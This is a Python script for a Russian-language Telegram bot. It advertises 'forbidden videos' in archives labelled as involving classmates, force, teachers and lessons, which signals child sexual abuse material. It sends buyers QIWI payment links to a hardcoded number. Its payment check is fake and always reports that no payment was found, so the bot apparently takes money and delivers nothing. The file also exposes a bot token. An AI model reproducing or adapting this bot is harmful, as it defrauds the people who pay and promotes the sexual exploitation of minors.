import random
import time
import telebot
import requests
from telebot import types

#ДАННЫЕ, КОТОРЫЕ НУЖНО МЕНЯТЬ
bot = telebot.TeleBot('1647376476:AAEcF-CTLh19XUQI-q5G11fUJ4ZJw7EweqY') #токен из @botfather

manager = 'https://t.me/MafiaBoss123'                           #телеграм менеджера
qiwi_numb = '+ххх'                         #номер киви
yandex_numb = 'ххх'                     #номер яндекс
card_numb = 'хххх хххх хххх хххх'                   #номер карты
btc_numb = 'ххх'     #btc кошелек

markdown = """
    *bold text*
    _italic text_
    [text](URL)
    """

#KEYBOARDS
keyboard1 = telebot.types.ReplyKeyboardMarkup(True)
keyboard1.row('Доступ в приват')
keyboard1.row('Горячие архивы')
keyboard1.row('Тех. поддержка 👨🏻‍💻')

deliveryClub = telebot.types.ReplyKeyboardMarkup(True)
deliveryClub.row('🔄 Проверить оплату')
deliveryClub.row('❌Отменить действие❌')

yandexEat = telebot.types.ReplyKeyboardMarkup(True)
yandexEat.row('❤89 RUB(Одноклассники)❤', '💥109 RUB(Силой)💥')
yandexEat.row('🔥149 RUB(С учителем)🔥', '👑179 RUB(На уроке)👑')
yandexEat.row('❌Отменить действие❌')

keyboard_check = telebot.types.ReplyKeyboardMarkup(True)
keyboard_check.row('🔄 Проверить оплату', '❌ Отменить платеж')


@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(message.chat.id, '''📹 Продажа самых горячих запретных видео 📹
                                     \n😏 Сотни довольных пользователей 😏
                                     \n🗃  Архивы разбиты по категориям! 🗃
                                     \n🔥 Приватка и все архивы обновляются ежедневно!🔥
                                     \n💯На сегодня действуют скидки на большие архивы💯
                                     \n💯Успей ухватить!💯
                                     \n🕔 Тех. поддержка и бот работает 24/7 🕔
                                     \n🔥 Для тебя найдется все что угодно) 🔥''', reply_markup=keyboard1, parse_mode= "Markdown")
@bot.message_handler(content_types=['text'])
def send_message(message):
    if message.text == 'Доступ в приват':
        bot.send_message(message.chat.id, '🔥🕔 Новые видео КАЖДЫЙ ЧАС! 🕔🔥\n🔥 Всего за 🔥69RUB🔥 доступ навсегда! 🔥\nПеред оплатой сохраните 5-значный код\nВ случае ошибки тех.поддержке будет легче вам помочь\nВаша ссылка на оплату:\nhttps://qiwi.com/payment/form/99?extra[%27account%27]=+79851588389&amountInteger=69&amountFraction=00&comment=65432', reply_markup=deliveryClub)
    elif message.text == 'Горячие архивы':
        bot.send_message(message.chat.id, '📹 Выберите один из доступных архивов 📹\n💵 Сумма указана уже с учетом скидки 💵\n🔥 -40% для каждого из архива! 🔥', reply_markup=yandexEat)
    elif message.text == '❤89 RUB(Одноклассники)❤':
        bot.send_message(message.chat.id, '📹 Вы выбрали архив ❤Одноклассники❤ 📹\nПеред оплатой сохраните 5-значный код\nВаша ссылка на оплату:\nhttps://qiwi.com/payment/form/99?extra[%27account%27]=+79851588389&amountInteger=89&amountFraction=00&comment=79047', reply_markup=keyboard_check)
    elif message.text == '🔥149 RUB(С учителем)🔥':
        bot.send_message(message.chat.id, '📹 Вы выбрали архив ❤С учителем❤ 📹\nПеред оплатой сохраните 5-значный код\nВаша ссылка на оплату:\nhttps://qiwi.com/payment/form/99?extra[%27account%27]=+79851588389&amountInteger=109&amountFraction=00&comment=23562', reply_markup=keyboard_check)
    elif message.text == '💥109 RUB(Силой)💥':
        bot.send_message(message.chat.id, '📹 Вы выбрали архив ❤Силой❤ 📹\nПеред оплатой сохраните 5-значный код\nВаша ссылка на оплату:\nhttps://qiwi.com/payment/form/99?extra[%27account%27]=+79851588389&amountInteger=149&amountFraction=00&comment=69027', reply_markup=keyboard_check)
    elif message.text == '👑179 RUB(На уроке)👑':
        bot.send_message(message.chat.id, '📹 Вы выбрали архив ❤На уроке❤ 📹\nПеред оплатой сохраните 5-значный код\nВаша ссылка на оплату:\nhttps://qiwi.com/payment/form/99?extra[%27account%27]=+79851588389&amountInteger=179&amountFraction=00&comment=32542', reply_markup=keyboard_check)
    elif message.text == '🔄 Проверить оплату':
        bot.send_message(message.chat.id, '🔎 Поиск платежа . . .', parse_mode= "Markdown")
        time.sleep(3)
        bot.send_message(message.chat.id, '🚫 *Платеж не был найден*', parse_mode= "Markdown")
        bot.delete_message(message.chat.id, message.message_id +1,)
    elif message.text == '❌ Отменить платеж':
        bot.send_message(message.chat.id, '❌ Платеж отменен', parse_mode='Markdown', reply_markup=keyboard1)
    elif message.text == 'Тех. поддержка 👨🏻‍💻':
        bot.send_message(message.chat.id, 'У Вас возникла проблема⁉️\nОбратитесь в телеграм канал тех. поддержки 👨🏻‍💻:\nhttps://t.me/bestieboss', parse_mode='Markdown', reply_markup=keyboard1)
    elif message.text == '❌Отменить действие❌':
        bot.send_message(message.chat.id, '''📹 Продажа самых горячих запретных видео 📹
                                     \n😏 Сотни довольных пользователей 😏
                                     \n🗃  Архивы разбиты по категориям! 🗃
                                     \n🔥 Приватка и все архивы обновляются ежедневно!🔥
                                     \n💯На сегодня действуют скидки на большие архивы💯
                                     \n💯Успей ухватить!💯
                                     \n🕔 Тех. поддержка и бот работает 24/7 🕔
                                     \n🔥 Для тебя найдется все что угодно) 🔥''', reply_markup=keyboard1, parse_mode= "Markdown")
    else: bot.send_message(message.chat.id, 'Бот не отвечает на обычные сообщения', reply_markup=keyboard1)    

bot.polling()

